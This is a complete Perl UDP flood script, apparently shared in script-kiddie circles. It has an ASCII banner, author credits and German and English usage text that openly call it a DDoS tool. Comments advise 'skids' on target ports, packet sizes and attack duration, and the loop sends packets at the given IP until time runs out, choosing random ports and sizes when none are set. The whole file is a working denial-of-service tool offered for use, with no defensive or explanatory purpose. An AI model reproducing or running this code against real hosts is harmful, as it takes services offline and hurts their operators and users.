#!/usr/bin/perl

#Created by ~TwentyOne
#Reccomendations (For skids): 
#IP -   Don't DDoS Government Websites.
#Port - Use '80' for HTTP (Most Common) or '53' for DNS or '443' for https.
#Size - Use '100 - 1000' (Reccomended).
#Time - Depending on the bandwith of your server, use how ever much you want (You can always press Ctrl-C to cancel).
 
use Socket;
use strict;

print '
 /$$$$$$$$                              /$$              /$$$$$$                   
|__  $$__/                             | $$             /$$__  $$                  
   | $$/$$  /$$  /$$ /$$$$$$ /$$$$$$$ /$$$$$$  /$$   /$| $$  \ $$/$$$$$$$  /$$$$$$ \'s
   | $| $$ | $$ | $$/$$__  $| $$__  $|_  $$_/ | $$  | $| $$  | $| $$__  $$/$$__  $$
   | $| $$ | $$ | $| $$$$$$$| $$  \ $$ | $$   | $$  | $| $$  | $| $$  \ $| $$$$$$$$
   | $| $$ | $$ | $| $$_____| $$  | $$ | $$ /$| $$  | $| $$  | $| $$  | $| $$_____/
   | $|  $$$$$/$$$$|  $$$$$$| $$  | $$ |  $$$$|  $$$$$$|  $$$$$$| $$  | $|  $$$$$$$
   |__/\_____/\___/ \_______|__/  |__/  \___/  \____  $$\______/|__/  |__/\_______/
                                               /$$  | $$                           
                                              |  $$$$$$/                           
                                               \______/         
';
print "\n";

 
if ($#ARGV != 3) {
  print "\n\t\t\t***Erstellt Von ]Creep1ng/Dr3ams] André***\n";
  print "->perl DDoS.pl 1.1.1.1 80 1000 300\n";
  print "->Distributed-Denial-Of-Service-Attack die IP '1.1.1.1' für '300' Sekunden Auf Port '80' Benutze '1000' Packete\n\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~Zum Abbrechen drück \'STRG-C\'\n\n";
print "|IP|\t\t |Port|\t\t |Packete|\t\t |Zeit|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "To cancel the attack press 'Ctrl-C'\n" unless $time;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
